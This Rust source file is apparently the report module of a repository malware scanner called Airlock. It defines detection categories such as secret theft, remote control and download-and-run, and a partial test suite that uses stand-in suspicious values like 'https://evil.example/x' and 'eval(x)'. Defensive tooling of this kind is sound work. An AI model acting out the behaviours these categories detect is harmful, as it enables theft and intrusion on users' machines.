//! Everything a scan finds, listed for the user to judge.
//!
//! Being listed doesn't mean something is malicious. Nothing is filtered out
//! for looking harmless, because that decision belongs to the user. Every check
//! reports through `Report::add`, so new checks get the same treatment.
//!
//! Color codes come only from the palette here. All repository text is escaped
//! before it is painted, so a repository can't send its own codes to a terminal.

use crate::text::{Untrusted, escape};
use std::collections::{BTreeMap, BTreeSet};
use std::fmt;
use std::io::IsTerminal;

/// How many places are named per finding. All of them are still counted.
const MAX_LOCATIONS: usize = 5;
const MAX_CALLS_PER_FILE: usize = 50;
/// A hostile repo could contain millions of unique addresses. Past this limit
/// items are counted and the report says it is incomplete.
const MAX_REPORT_BYTES: usize = 128 * 1024 * 1024;
const ENTRY_OVERHEAD_BYTES: usize = 128;
const LOCATION_COLUMN: usize = 67;
const ALARM_WIDTH: usize = 92;
const BYTES_PER_MB: f64 = 1_000_000.0;

/// How serious a section is.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum Level {
    Note,
    Warning,
    Danger,
}

impl Level {
    const HIGHEST_FIRST: [Self; 3] = [Self::Danger, Self::Warning, Self::Note];

    fn label(self) -> &'static str {
        match self {
            Self::Danger => "DANGER",
            Self::Warning => "WARNING",
            Self::Note => "NOTE",
        }
    }

    fn meaning(self) -> &'static str {
        match self {
            Self::Danger => "could harm your computer if you run this repository",
            Self::Warning => "check these before you trust this repository",
            Self::Note => "listed so you can see them, not checked for safety",
        }
    }
}

/// The sections of a report, in printing order.
///
/// The most serious section prints last, right above the summary and the alarm.
/// A long list of harmless links can then never push it off the screen.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum Kind {
    DocumentationAddress,
    LockfileAddress,
    MentionedAddress,
    LocalAddress,
    MinifiedCode,
    CollapsedInReview,
    KnownVulnerable,
    NotRead,
    DependencyNotChecked,
    OpaqueFile,
    VendoredPackages,
    Submodule,
    LinkOutside,
    LongCodeLine,
    EncodedBlob,
    HiddenData,
    UnusualCharacters,
    RunsOnBuild,
    AutoRun,
    AiInstructions,
    ContainerAccess,
    IpAddress,
    NetworkCall,
    CallWithoutAddress,
    RiskyHost,
    HiddenAddress,
    LookalikeLetters,
    LookalikePackage,
    UnusualPackageSource,
    HadMaliciousReleases,
    WatchesUser,
    ChecksForAnalysis,
    InjectsCode,
    WeakensSecurity,
    CoversTracks,
    HidesItsWindow,
    StaysOnComputer,
    ReadsSecrets,
    DisguisedFile,
    InvisibleText,
    ObfuscatedCode,
    OffScreenCode,
    HiddenCode,
    HidesConnection,
    RunsHiddenCode,
    CallsRawIp,
    UnsafePackageSource,
    DestroysFiles,
    DisablesSecurity,
    ActsInSecret,
    CryptoMiner,
    RemoteControl,
    StealsSecrets,
    AutoRunHidden,
    AutoRunNetwork,
    DownloadsAndRuns,
    KnownMalicious,
}

impl Kind {
    fn level(self) -> Level {
        match self {
            Self::DocumentationAddress
            | Self::LockfileAddress
            | Self::MentionedAddress
            | Self::LocalAddress
            | Self::MinifiedCode
            | Self::CollapsedInReview => Level::Note,
            Self::KnownVulnerable
            | Self::NotRead
            | Self::DependencyNotChecked
            | Self::OpaqueFile
            | Self::VendoredPackages
            | Self::Submodule
            | Self::LinkOutside
            | Self::LongCodeLine
            | Self::EncodedBlob
            | Self::HiddenData
            | Self::UnusualCharacters
            | Self::RunsOnBuild
            | Self::AutoRun
            | Self::AiInstructions
            | Self::ContainerAccess
            | Self::IpAddress
            | Self::NetworkCall
            | Self::CallWithoutAddress
            | Self::RiskyHost
            | Self::HiddenAddress
            | Self::LookalikeLetters
            | Self::LookalikePackage
            | Self::UnusualPackageSource
            | Self::HadMaliciousReleases
            | Self::WatchesUser
            | Self::ChecksForAnalysis
            | Self::InjectsCode
            | Self::WeakensSecurity
            | Self::CoversTracks
            | Self::HidesItsWindow
            | Self::StaysOnComputer
            | Self::ReadsSecrets => Level::Warning,
            Self::DisguisedFile
            | Self::InvisibleText
            | Self::ObfuscatedCode
            | Self::OffScreenCode
            | Self::HiddenCode
            | Self::HidesConnection
            | Self::RunsHiddenCode
            | Self::CallsRawIp
            | Self::UnsafePackageSource
            | Self::DestroysFiles
            | Self::DisablesSecurity
            | Self::ActsInSecret
            | Self::CryptoMiner
            | Self::RemoteControl
            | Self::StealsSecrets
            | Self::AutoRunHidden
            | Self::AutoRunNetwork
            | Self::DownloadsAndRuns
            | Self::KnownMalicious => Level::Danger,
        }
    }

    fn title(self) -> &'static str {
        match self {
            Self::DocumentationAddress => "Addresses in documentation",
            Self::LockfileAddress => "Addresses in lockfiles",
            Self::MentionedAddress => "Other addresses in code and config",
            Self::LocalAddress => "Local, private and reserved addresses",
            Self::MinifiedCode => "Minified code, too dense to review by eye",
            Self::CollapsedInReview => "Files marked to be collapsed or skipped in code review",
            Self::KnownVulnerable => "Dependencies with known security bugs",
            Self::NotRead => "Not checked: Airlock could not read these",
            Self::DependencyNotChecked => "Dependencies not checked for known malware",
            Self::OpaqueFile => "Files Airlock cannot read inside",
            Self::VendoredPackages => {
                "Installed packages committed to the repository, which skip package checks"
            }
            Self::Submodule => "Submodules: other repositories this one pulls in, not scanned",
            Self::LinkOutside => "Links pointing outside the repository",
            Self::LongCodeLine => "Very long lines of code in files that are hard to review",
            Self::EncodedBlob => "Long blocks of encoded data inside code",
            Self::HiddenData => "Extra data hidden inside a media file",
            Self::UnusualCharacters => {
                "Characters that can hide text, in tests, bundled code or terminal output"
            }
            Self::RunsOnBuild => "Runs when you build, test or start this project",
            Self::AutoRun => "Runs automatically when installed or opened",
            Self::AiInstructions => "Instructions that AI coding tools will read and may follow",
            Self::ContainerAccess => "Containers given access to your computer",
            Self::IpAddress => "Raw IP addresses, some may be version numbers",
            Self::NetworkCall => "Contacts these addresses",
            Self::CallWithoutAddress => "Connects somewhere Airlock cannot see",
            Self::RiskyHost => "Services often used to host malware or receive stolen data",
            Self::HiddenAddress => "Addresses or commands stored in encoded text",
            Self::LookalikeLetters => "Names using look-alike letters from another alphabet",
            Self::LookalikePackage => "Package names that look like popular packages",
            Self::UnusualPackageSource => "Packages from outside the normal registry, not checked",
            Self::HadMaliciousReleases => {
                "Package has had malicious releases, check which version gets installed"
            }
            Self::WatchesUser => "Watches the keyboard, screen or clipboard",
            Self::ChecksForAnalysis => "Checks whether it is being watched or analyzed",
            Self::InjectsCode => "Injects code into other programs",
            Self::WeakensSecurity => "Weakens a security protection",
            Self::CoversTracks => "Deletes itself or its traces",
            Self::HidesItsWindow => "Starts programs hidden from view",
            Self::StaysOnComputer => "Sets itself up to run again later",
            Self::ReadsSecrets => "Reads passwords, keys or other secrets",
            Self::DisguisedFile => "Program, archive or script disguised as another type of file",
            Self::InvisibleText => "Invisible characters that change what the text says",
            Self::ObfuscatedCode => "Code disguised so people cannot read it",
            Self::OffScreenCode => "Code hidden off the edge of the screen",
            Self::HiddenCode => "Code or commands hidden inside encoded text",
            Self::HidesConnection => "Hides where it connects to",
            Self::RunsHiddenCode => "Decodes hidden code and runs it",
            Self::CallsRawIp => "Contacts a raw IP address, which hides who is behind it",
            Self::UnsafePackageSource => "Installs packages from an unsafe address",
            Self::DestroysFiles => "Can destroy your files",
            Self::DisablesSecurity => "Turns off security protections",
            Self::ActsInSecret => "Contacts the internet while covering what it does",
            Self::CryptoMiner => "Mines cryptocurrency using your computer",
            Self::RemoteControl => "Gives someone remote control of your computer",
            Self::StealsSecrets => "Collects passwords, keys or wallets and contacts the internet",
            Self::AutoRunHidden => "Runs automatically, and its code is disguised",
            Self::AutoRunNetwork => {
                "Contacts the internet automatically when installed, opened or built"
            }
            Self::DownloadsAndRuns => "Downloads code from the internet and runs it",
            Self::KnownMalicious => "Known malicious package",
        }
    }

    /// Whether the subject is one bare address, as opposed to a line of code.
    fn is_address(self) -> bool {
        matches!(
            self,
            Self::DocumentationAddress
                | Self::LockfileAddress
                | Self::MentionedAddress
                | Self::LocalAddress
                | Self::IpAddress
                | Self::NetworkCall
                | Self::RiskyHost
                | Self::CallsRawIp
                | Self::AutoRunNetwork
        )
    }
}

/// The codes used to style a report. All empty when color is off.
pub struct Palette {
    is_color: bool,
    danger_tag: &'static str,
    warning_tag: &'static str,
    note_tag: &'static str,
    danger_title: &'static str,
    warning_title: &'static str,
    note_title: &'static str,
    strong: &'static str,
    dim: &'static str,
    location: &'static str,
    brand: &'static str,
}

const RESET: &str = "\x1b[0m";

pub const PLAIN: Palette = Palette {
    is_color: false,
    danger_tag: "",
    warning_tag: "",
    note_tag: "",
    danger_title: "",
    warning_title: "",
    note_title: "",
    strong: "",
    dim: "",
    location: "",
    brand: "",
};

pub const COLOR: Palette = Palette {
    is_color: true,
    danger_tag: "\x1b[1;97;41m",
    warning_tag: "\x1b[1;30;43m",
    note_tag: "\x1b[1;97;100m",
    danger_title: "\x1b[1;91m",
    // The plain yellow, because bright yellow can't be read on a light terminal.
    warning_title: "\x1b[1;33m",
    note_title: "\x1b[1;90m",
    strong: "\x1b[1m",
    dim: "\x1b[90m",
    location: "\x1b[36m",
    brand: "\x1b[1;30;47m",
};

impl Palette {
    /// The palette for the terminal this program is running in. Color stays off
    /// when output goes to a file or program, and wherever it might print as
    /// garbage, so the labels must always make sense without it.
    pub fn for_terminal() -> &'static Self {
        let is_terminal = std::io::stdout().is_terminal();
        let env = |name: &str| std::env::var_os(name).filter(|value| !value.is_empty());
        let term = std::env::var("TERM").ok();

        // Asking comes first, because it's what turns color on. The rest are
        // terminals that handle color themselves and may refuse the request.
        let windows_console_ok = (is_terminal && windows_console_accepts_color())
            || env("WT_SESSION").is_some()
            || env("TERM_PROGRAM").is_some()
            || env("ConEmuANSI").is_some()
            || term.is_some();

        if wants_color(
            is_terminal,
            env("NO_COLOR").is_some(),
            term.as_deref(),
            cfg!(windows),
            windows_console_ok,
        ) {
            &COLOR
        } else {
            &PLAIN
        }
    }

    fn paint(&self, code: &str, text: &str) -> String {
        if code.is_empty() {
            text.to_string()
        } else {
            format!("{code}{text}{RESET}")
        }
    }

    fn tag(&self, level: Level) -> String {
        let code = match level {
            Level::Danger => self.danger_tag,
            Level::Warning => self.warning_tag,
            Level::Note => self.note_tag,
        };
        if self.is_color {
            self.paint(code, &format!(" {} ", level.label()))
        } else {
            format!("[{}]", level.label())
        }
    }

    fn title(&self, level: Level, text: &str) -> String {
        let code = match level {
            Level::Danger => self.danger_title,
            Level::Warning => self.warning_title,
            Level::Note => self.note_title,
        };
        self.paint(code, text)
    }

    /// A full-width alarm line in color, or plain text without it.
    fn alarm(&self, code: &str, text: &str) -> String {
        if self.is_color {
            self.paint(code, &format!("{text:<ALARM_WIDTH$}"))
        } else {
            text.to_string()
        }
    }
}

/// Asks Windows to understand color codes, which older versions can't do.
#[cfg(windows)]
fn windows_console_accepts_color() -> bool {
    enable_ansi_support::enable_ansi_support().is_ok()
}

#[cfg(not(windows))]
fn windows_console_accepts_color() -> bool {
    false
}

fn wants_color(
    is_terminal: bool,
    no_color: bool,
    term: Option<&str>,
    is_windows: bool,
    windows_console_ok: bool,
) -> bool {
    if !is_terminal || no_color || term == Some("dumb") {
        return false;
    }
    // Old Windows consoles print color codes as text, unless they accept the
    // request to understand them.
    if is_windows {
        windows_console_ok
    } else {
        term.is_some()
    }
}

/// Where something was found.
#[derive(Clone, Copy)]
pub struct At<'a> {
    pub path: &'a Untrusted,
    /// Absent for binary files, where line numbers mean nothing.
    pub line: Option<u64>,
}

/// A network call found in a file, kept so later checks can ask which files
/// contact the internet.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Call {
    pub group: String,
    pub subject: String,
    pub line: Option<u64>,
}

/// Facts about the scan, shown at the top of the report.
pub struct ScanInfo<'a> {
    pub name: &'a str,
    pub commit: Option<&'a str>,
    /// What a link named, such as `("branch", "main")` or `("tag", "v1.0")`.
    pub reference: Option<(&'a str, &'a str)>,
    /// The folder or file, when a link named one.
    pub path: Option<&'a str>,
    pub files: u64,
    pub bytes: u64,
    pub packages_checked: usize,
}

#[derive(PartialEq, Eq, PartialOrd, Ord)]
struct Key {
    kind: Kind,
    group: String,
    subject: String,
}

#[derive(Default)]
struct Entry {
    count: u64,
    /// Shown beside the subject when it has no location, such as why a file
    /// couldn't be read.
    detail: Option<String>,
    locations: Vec<(Untrusted, Option<u64>)>,
}

/// Everything found so far.
pub struct Report {
    entries: BTreeMap<Key, Entry>,
    calls: BTreeMap<String, Vec<Call>>,
    disguised: BTreeSet<String>,
    retained_bytes: usize,
    budget_bytes: usize,
    not_listed: u64,
}

impl Report {
    pub fn new() -> Self {
        Self::with_budget(MAX_REPORT_BYTES)
    }

    fn with_budget(budget_bytes: usize) -> Self {
        Self {
            entries: BTreeMap::new(),
            calls: BTreeMap::new(),
            disguised: BTreeSet::new(),
            retained_bytes: 0,
            budget_bytes,
            not_listed: 0,
        }
    }

    /// Records a finding. `group` collects related findings under one heading,
    /// such as the addresses on one host, and may be empty.
    pub fn add(&mut self, kind: Kind, group: &str, subject: &str, at: Option<At<'_>>) {
        let key = Key {
            kind,
            group: group.to_string(),
            subject: subject.to_string(),
        };
        let key_bytes = group.len() + subject.len() + ENTRY_OVERHEAD_BYTES;

        if !self.entries.contains_key(&key) && self.retained_bytes + key_bytes > self.budget_bytes {
            self.not_listed += 1;
            return;
        }

        let retained_bytes = &mut self.retained_bytes;
        let entry = self.entries.entry(key).or_insert_with(|| {
            *retained_bytes += key_bytes;
            Entry::default()
        });

        // Two checks can find the same thing in the same place.
        let already_there = at.is_some_and(|at| {
            entry
                .locations
                .iter()
                .any(|(path, line)| path == at.path && *line == at.line)
        });
        if already_there {
            return;
        }
        entry.count += 1;

        if let Some(at) = at {
            let location_bytes = at.path.raw().len() + ENTRY_OVERHEAD_BYTES;
            let fits = *retained_bytes + location_bytes <= self.budget_bytes;
            if entry.locations.len() < MAX_LOCATIONS && fits {
                *retained_bytes += location_bytes;
                entry.locations.push((at.path.clone(), at.line));
            }
        }
    }

    /// Records a finding that has an explanation rather than a location.
    pub fn add_detail(&mut self, kind: Kind, subject: &str, detail: &str) {
        self.add(kind, "", subject, None);
        let key = Key {
            kind,
            group: String::new(),
            subject: subject.to_string(),
        };
        if let Some(entry) = self.entries.get_mut(&key) {
            entry.detail = Some(detail.to_string());
        }
    }

    /// Records findings that had to be dropped before reaching the report.
    pub fn note_not_listed(&mut self, count: u64) {
        self.not_listed += count;
    }

    /// Remembers a network call in a file, for checks that run after every file
    /// has been read.
    pub fn record_call(&mut self, path: &str, call: Call) {
        let bytes = call.group.len() + call.subject.len() + ENTRY_OVERHEAD_BYTES;
        if self.retained_bytes + bytes > self.budget_bytes {
            return;
        }
        let calls = self.calls.entry(path.to_string()).or_default();
        if calls.len() < MAX_CALLS_PER_FILE {
            self.retained_bytes += bytes;
            calls.push(call);
        }
    }

    pub fn has_calls(&self, path: &str) -> bool {
        self.calls.contains_key(path)
    }

    pub fn calls_in(&self, path: &str) -> Vec<Call> {
        self.calls.get(path).cloned().unwrap_or_default()
    }

    /// Remembers that a person can't read this file's code, for checks that run
    /// after every file has been read.
    pub fn mark_disguised(&mut self, path: &str) {
        let bytes = path.len() + ENTRY_OVERHEAD_BYTES;
        if self.retained_bytes + bytes <= self.budget_bytes
            && self.disguised.insert(path.to_string())
        {
            self.retained_bytes += bytes;
        }
    }

    pub fn is_disguised(&self, path: &str) -> bool {
        self.disguised.contains(path)
    }

    pub fn has_findings(&self) -> bool {
        !self.entries.is_empty() || self.not_listed > 0
    }

    fn count_at(&self, level: Level) -> usize {
        self.entries
            .keys()
            .filter(|key| key.kind.level() == level)
            .count()
    }

    /// The full report as text.
    pub fn render(&self, info: &ScanInfo<'_>, palette: &Palette) -> String {
        Rendered {
            report: self,
            info,
            palette,
        }
        .to_string()
    }
}

struct Rendered<'a> {
    report: &'a Report,
    info: &'a ScanInfo<'a>,
    palette: &'a Palette,
}

impl fmt::Display for Rendered<'_> {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        self.write_header(f)?;
        self.write_sections(f)?;
        self.write_summary(f)?;
        self.write_limits(f)?;
        self.write_alarm(f)
    }
}

impl Rendered<'_> {
    fn write_header(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        let (info, palette) = (self.info, self.palette);
        let field = |name: &str| palette.paint(palette.dim, &format!("{name:<8}"));

        writeln!(
            f,
            "{} {}",
            palette.paint(palette.brand, " AIRLOCK "),
            palette.paint(palette.strong, info.name)
        )?;
        if let Some(commit) = info.commit {
            writeln!(f, " {} {commit}", field("commit"))?;
        }
        if let Some((label, name)) = info.reference {
            writeln!(f, " {} {}", field(label), escape(name))?;
        }
        if let Some(path) = info.path {
            writeln!(f, " {} {}", field("path"), escape(path))?;
        }
        writeln!(
            f,
            " {} {} {}, {:.1} MB",
            field("read"),
            info.files,
            if info.files == 1 { "file" } else { "files" },
            info.bytes as f64 / BYTES_PER_MB
        )?;
        writeln!(
            f,
            " {} {} packages against the OSV malware database",
            field("checked"),
            info.packages_checked
        )
    }

    fn write_sections(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        let palette = self.palette;
        let mut counts: BTreeMap<Kind, u64> = BTreeMap::new();
        for key in self.report.entries.keys() {
            *counts.entry(key.kind).or_default() += 1;
        }

        let mut section = None;
        let mut group = None;
        for (key, entry) in &self.report.entries {
            if section != Some(key.kind) {
                let level = key.kind.level();
                writeln!(
                    f,
                    "\n{} {} {}",
                    palette.tag(level),
                    palette.title(level, key.kind.title()),
                    palette.paint(palette.dim, &format!("({})", counts[&key.kind]))
                )?;
                section = Some(key.kind);
                group = None;
            }
            if !key.group.is_empty() && group != Some(key.group.as_str()) {
                writeln!(f, "  {}", palette.paint(palette.strong, &show_group(key)))?;
                group = Some(key.group.as_str());
            }
            self.write_entry(f, key, entry)?;
        }
        Ok(())
    }

    fn write_entry(&self, f: &mut fmt::Formatter<'_>, key: &Key, entry: &Entry) -> fmt::Result {
        let palette = self.palette;
        let left = format!("    {}", show_subject(key));
        let gap = " ".repeat(LOCATION_COLUMN.saturating_sub(left.chars().count()).max(2));

        if let Some(detail) = &entry.detail {
            let detail = palette.paint(palette.dim, &escape(detail));
            return writeln!(f, "{left}{gap}{detail}");
        }

        let named = entry.locations.len() as u64;
        let extra = entry.count.saturating_sub(named);
        let more = if named > 0 && extra > 0 {
            let places = if extra == 1 { "place" } else { "places" };
            format!(
                "  {}",
                palette.paint(palette.dim, &format!("+{extra} more {places}"))
            )
        } else {
            String::new()
        };

        let mut lines = entry.locations.iter().map(|(path, line)| match line {
            Some(line) => format!("{path}:{line}"),
            None => path.to_string(),
        });
        let Some(first) = lines.next() else {
            return writeln!(f, "{left}");
        };

        let lines: Vec<String> = std::iter::once(first).chain(lines).collect();
        let last = lines.len() - 1;
        for (index, location) in lines.iter().enumerate() {
            let shown = palette.paint(palette.location, location);
            let suffix = if index == last { more.as_str() } else { "" };
            if index == 0 {
                writeln!(f, "{left}{gap}{shown}{suffix}")?;
            } else {
                writeln!(f, "{:LOCATION_COLUMN$}{shown}{suffix}", "")?;
            }
        }
        Ok(())
    }

    fn write_summary(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        let palette = self.palette;
        writeln!(f, "\n{}", palette.paint(palette.brand, " SUMMARY "))?;
        for level in Level::HIGHEST_FIRST {
            let count = format!("{:>4}", self.report.count_at(level));
            writeln!(
                f,
                "{}  {}{}",
                palette.paint(palette.strong, &count),
                palette.title(level, &format!("{:<9}", level.label())),
                level.meaning()
            )?;
        }
        if self.report.not_listed > 0 {
            writeln!(
                f,
                "\nThis list is incomplete: {} more items were found but not listed.",
                self.report.not_listed
            )?;
        }
        Ok(())
    }

    fn write_limits(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        let palette = self.palette;
        let mut lines = vec![
            " Airlock read this repository in memory. None of its files were saved or run.",
            " It looks for known tricks and doesn't understand what code really does, so new",
            " tricks can get past it, and it can't see what code downloads once it runs.",
            " This report covers the commit above. A later commit could be different.",
        ];
        if self.info.path.is_some() {
            lines.push(" Only this path was scanned, not the rest of the repository.");
        }

        writeln!(f)?;
        for line in lines {
            writeln!(f, "{}", palette.paint(palette.dim, line))?;
        }
        Ok(())
    }

    fn write_alarm(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        let palette = self.palette;
        let dangers = self.report.count_at(Level::Danger);

        let (code, lines) = if dangers > 0 {
            let plural = if dangers == 1 { "finding" } else { "findings" };
            (
                palette.danger_tag,
                [
                    format!(
                        "  DANGER: {dangers} dangerous {plural} in {}",
                        self.info.name
                    ),
                    "  Do not install, build, run or open this repository unless you have checked"
                        .to_string(),
                    "  and trust every DANGER item above.".to_string(),
                ],
            )
        } else {
            (
                palette.warning_tag,
                [
                    "  NO DANGER FOUND. THIS DOES NOT MEAN THE REPOSITORY IS SAFE.".to_string(),
                    "  Airlock only recognizes known patterns, and malicious code can hide from it."
                        .to_string(),
                    "  Check the warnings above, and run code you don't trust in an isolated environment."
                        .to_string(),
                ],
            )
        };

        writeln!(f)?;
        if palette.is_color {
            writeln!(f, "{}", palette.alarm(code, ""))?;
        }
        for line in &lines {
            writeln!(f, "{}", palette.alarm(code, line))?;
        }
        if palette.is_color {
            writeln!(f, "{}", palette.alarm(code, ""))?;
        }
        Ok(())
    }
}

fn show_group(key: &Key) -> String {
    let shown = escape(&key.group.replace('.', "[.]"));
    // These can imitate a familiar name letter for letter.
    if key.group.is_ascii() {
        shown
    } else {
        format!("{shown} (contains non-ASCII characters, check for look-alikes)")
    }
}

fn show_subject(key: &Key) -> String {
    let bare_address = key.kind.is_address() && !key.subject.contains(char::is_whitespace);
    if bare_address && !key.subject.contains("://") {
        escape(&key.subject.replace('.', "[.]"))
    } else {
        escape(&defang_links(&key.subject))
    }
}

/// Rewrites links so a terminal won't make them clickable. A report about
/// suspicious addresses must not make them one click away.
fn defang_links(text: &str) -> String {
    let mut shown = String::with_capacity(text.len());
    let mut rest = text;

    while let Some(at) = rest.find("://") {
        shown.push_str(&rest[..at]);
        shown.push_str("[://]");
        rest = &rest[at + 3..];

        let end = rest
            .find(|c: char| {
                c.is_whitespace()
                    || matches!(
                        c,
                        '/' | '?' | '#' | '"' | '\'' | '`' | '(' | ')' | '<' | '>'
                    )
            })
            .unwrap_or(rest.len());
        shown.push_str(&rest[..end].replace('.', "[.]"));
        rest = &rest[end..];
    }
    shown.push_str(rest);
    shown
}

#[cfg(test)]
impl Report {
    /// The subjects listed in a section, with how many times each was seen.
    pub fn listed(&self, kind: Kind) -> Vec<(String, u64)> {
        self.entries
            .iter()
            .filter(|(key, _)| key.kind == kind)
            .map(|(key, entry)| (key.subject.clone(), entry.count))
            .collect()
    }

    /// The first line number recorded for a subject.
    pub fn first_line(&self, kind: Kind, subject: &str) -> Option<u64> {
        self.entries
            .iter()
            .find(|(key, _)| key.kind == kind && key.subject == subject)
            .and_then(|(_, entry)| entry.locations.first())
            .and_then(|(_, line)| *line)
    }

    pub fn group_of(&self, kind: Kind, subject: &str) -> Option<String> {
        self.entries
            .keys()
            .find(|key| key.kind == kind && key.subject == subject)
            .map(|key| key.group.clone())
    }

    pub fn detail_of(&self, kind: Kind, subject: &str) -> Option<String> {
        self.entries
            .iter()
            .find(|(key, _)| key.kind == kind && key.subject == subject)
            .and_then(|(_, entry)| entry.detail.clone())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    const ALL_KINDS: [Kind; 57] = [
        Kind::DocumentationAddress,
        Kind::LockfileAddress,
        Kind::MentionedAddress,
        Kind::LocalAddress,
        Kind::MinifiedCode,
        Kind::CollapsedInReview,
        Kind::KnownVulnerable,
        Kind::NotRead,
        Kind::DependencyNotChecked,
        Kind::OpaqueFile,
        Kind::VendoredPackages,
        Kind::Submodule,
        Kind::LinkOutside,
        Kind::LongCodeLine,
        Kind::EncodedBlob,
        Kind::HiddenData,
        Kind::UnusualCharacters,
        Kind::RunsOnBuild,
        Kind::AutoRun,
        Kind::AiInstructions,
        Kind::ContainerAccess,
        Kind::IpAddress,
        Kind::NetworkCall,
        Kind::CallWithoutAddress,
        Kind::RiskyHost,
        Kind::HiddenAddress,
        Kind::LookalikeLetters,
        Kind::LookalikePackage,
        Kind::UnusualPackageSource,
        Kind::HadMaliciousReleases,
        Kind::WatchesUser,
        Kind::ChecksForAnalysis,
        Kind::InjectsCode,
        Kind::WeakensSecurity,
        Kind::CoversTracks,
        Kind::HidesItsWindow,
        Kind::StaysOnComputer,
        Kind::ReadsSecrets,
        Kind::DisguisedFile,
        Kind::InvisibleText,
        Kind::ObfuscatedCode,
        Kind::OffScreenCode,
        Kind::HiddenCode,
        Kind::HidesConnection,
        Kind::RunsHiddenCode,
        Kind::CallsRawIp,
        Kind::UnsafePackageSource,
        Kind::DestroysFiles,
        Kind::DisablesSecurity,
        Kind::ActsInSecret,
        Kind::CryptoMiner,
        Kind::RemoteControl,
        Kind::StealsSecrets,
        Kind::AutoRunHidden,
        Kind::AutoRunNetwork,
        Kind::DownloadsAndRuns,
        Kind::KnownMalicious,
    ];

    fn path(name: &str) -> Untrusted {
        Untrusted::from_bytes(name.as_bytes())
    }

    fn at(path: &Untrusted, line: u64) -> Option<At<'_>> {
        Some(At {
            path,
            line: Some(line),
        })
    }

    fn info() -> ScanInfo<'static> {
        ScanInfo {
            name: "github.com/o/r",
            commit: Some("abc123"),
            reference: None,
            path: None,
            files: 214,
            bytes: 1_300_000,
            packages_checked: 12,
        }
    }

    fn plain(report: &Report) -> String {
        report.render(&info(), &PLAIN)
    }

    /// Removes the palette's own codes, leaving any that came from elsewhere.
    fn strip_palette_codes(text: &str) -> String {
        let mut stripped = text.to_string();
        for code in [
            COLOR.danger_tag,
            COLOR.warning_tag,
            COLOR.note_tag,
            COLOR.danger_title,
            COLOR.warning_title,
            COLOR.note_title,
            COLOR.strong,
            COLOR.dim,
            COLOR.location,
            COLOR.brand,
            RESET,
        ] {
            stripped = stripped.replace(code, "");
        }
        stripped
    }

    #[test]
    fn lists_every_finding_however_many_there_are() {
        let file = path("a.js");
        let mut report = Report::new();
        for number in 0..500 {
            let url = format!("https://host{number}.example/x");
            report.add(Kind::MentionedAddress, "", &url, at(&file, number));
        }

        let shown = plain(&report);

        for number in 0..500 {
            assert!(
                shown.contains(&format!("host{number}[.]example")),
                "{number}"
            );
        }
        assert!(shown.contains("Other addresses in code and config (500)"));
    }

    #[test]
    fn repeats_are_counted_and_a_few_places_are_named() {
        let file = path("a.js");
        let mut report = Report::new();
        for line in 1..=8 {
            report.add(Kind::NetworkCall, "", "https://a.example", at(&file, line));
        }

        let shown = plain(&report);

        assert!(shown.contains("a.js:5"));
        assert!(!shown.contains("a.js:6"));
        assert!(shown.contains("+3 more places"));
        assert_eq!(
            report.listed(Kind::NetworkCall),
            [("https://a.example".to_string(), 8)]
        );
    }

    #[test]
    fn the_same_place_is_only_named_once() {
        let file = path("a.js");
        let mut report = Report::new();
        report.add(Kind::DownloadsAndRuns, "", "eval(x)", at(&file, 3));
        report.add(Kind::DownloadsAndRuns, "", "eval(x)", at(&file, 3));
        report.add(Kind::DownloadsAndRuns, "", "eval(x)", at(&file, 9));

        assert_eq!(
            report.listed(Kind::DownloadsAndRuns),
            [("eval(x)".to_string(), 2)]
        );
    }

    #[test]
    fn says_place_for_one_extra_location() {
        let file = path("a.js");
        let mut report = Report::new();
        for line in 1..=6 {
            report.add(Kind::NetworkCall, "", "https://a.example", at(&file, line));
        }

        assert!(plain(&report).contains("+1 more place\n"));
    }

    #[test]
    fn keeps_the_location_beside_the_address() {
        let file = path("README.md");
        let mut report = Report::new();
        report.add(
            Kind::DocumentationAddress,
            "docs.rs",
            "https://docs.rs/tokio",
            at(&file, 12),
        );

        let shown = plain(&report);
        let line = shown.lines().find(|line| line.contains("tokio")).unwrap();

        assert!(line.ends_with("README.md:12"));
        assert_eq!(line.find("README.md"), Some(LOCATION_COLUMN));
    }

    #[test]
    fn shows_a_detail_beside_a_finding_without_a_location() {
        let mut report = Report::new();
        report.add_detail(Kind::NotRead, "assets/big.bin", "too large (5 bytes)");

        let shown = plain(&report);
        let line = shown.lines().find(|line| line.contains("big.bin")).unwrap();

        assert!(line.ends_with("too large (5 bytes)"));
    }

    #[test]
    fn the_same_address_in_a_more_serious_place_is_not_hidden_by_a_harmless_one() {
        let readme = path("README.md");
        let script = path("install.js");
        let mut report = Report::new();
        let url = "https://evil.example/x";
        report.add(Kind::DocumentationAddress, "", url, at(&readme, 1));
        report.add(Kind::NetworkCall, "", url, at(&script, 9));

        let shown = plain(&report);

        assert!(shown.contains("README.md:1"));
        assert!(shown.contains("install.js:9"));
    }

    #[test]
    fn the_most_serious_section_prints_last_above_the_summary_and_alarm() {
        let file = path("a.js");
        let mut report = Report::new();
        report.add(
            Kind::DocumentationAddress,
            "",
            "https://d.example",
            at(&file, 1),
        );
        report.add(Kind::NetworkCall, "", "https://c.example", at(&file, 2));
        report.add(Kind::KnownMalicious, "", "bad 1.0 (npm)", at(&file, 3));

        let shown = plain(&report);
        let docs = shown.find("Addresses in documentation (1)").unwrap();
        let calls = shown.find("Contacts these addresses (1)").unwrap();
        let malicious = shown.find("Known malicious package (1)").unwrap();
        let summary = shown.find(" SUMMARY ").unwrap();
        let alarm = shown.find("DANGER: 1 dangerous finding in").unwrap();

        assert!(docs < calls && calls < malicious && malicious < summary && summary < alarm);
    }

    #[test]
    fn labels_each_section_by_how_serious_it_is() {
        let file = path("a.js");
        let mut report = Report::new();
        report.add(Kind::DocumentationAddress, "", "x", at(&file, 1));
        report.add(Kind::NetworkCall, "", "x", at(&file, 1));
        report.add(Kind::DownloadsAndRuns, "", "x", at(&file, 1));

        let shown = plain(&report);

        assert!(shown.contains("[NOTE] Addresses in documentation"));
        assert!(shown.contains("[WARNING] Contacts these addresses"));
